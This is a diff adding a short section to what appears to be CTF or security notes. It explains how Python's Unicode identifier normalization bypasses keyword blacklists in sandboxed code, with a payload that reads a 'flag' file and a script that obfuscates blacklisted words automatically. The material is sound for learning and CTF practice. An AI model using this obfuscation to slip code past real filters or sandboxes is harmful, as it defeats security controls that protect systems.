@@ -366,6 +366,36 @@ def search(root, target):
 
 </details>
 
+#### Unicode Bypass
+
+Python normalizes unicode characters for names, so they can be used if the check does not do this normalization. You can use unicode characters to replace names that would normally be blocked. For example, the following payload does not contain the string "open" or "read":
+
+```python
+𝘰𝘱𝘦𝘯("flag").𝘳𝘦𝘢𝘥()
+```
+
+Instead, it uses the 'Mathematical Sans-Serif Italic' (U+1D608...) characters which will normalize to ASCII letters when Python is executed (notice the slanted characters). You can create arbitrary payloads with a script like the following:
+
+```python
+BLACKLIST = ["open", "read"]
+
+def to_unicode(s):
+    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+    return ''.join([chr(alphabet.index(c) + 0x1D608) if c in alphabet else c for c in s])
+
+def obfuscate(payload):
+    for word in BLACKLIST:
+        payload = payload.replace(word, to_unicode(word))
+
+    return payload
+
+print(obfuscate('open("flag").read()'))  # 𝘰𝘱𝘦𝘯("flag").𝘳𝘦𝘢𝘥()
+```
+
+{% hint style="info" %}
+If a **shorter** payload (less bytes) is needed, you can mix-and-match these unicode characters in your payload. These unicode characters take up 4 bytes each, but you will likely **only need one** in your blacklisted word to bypass it, only requiring the penalty once
+{% endhint %}
+
 ## PyInstaller Reversing
 
 [PyInstaller](https://pyinstaller.org/en/stable/) can create executable and shareable files from Python scripts, like Windows `.exe` files or Linux ELF files. It can also be used for malware where an attacker creates a malicious Python script and compiles it to an executable they can plant somewhere with PyInstaller. That is why Reversing such a file can be very useful, and it turns out the full source code can almost flawlessly be decompiled from such a file.&#x20;
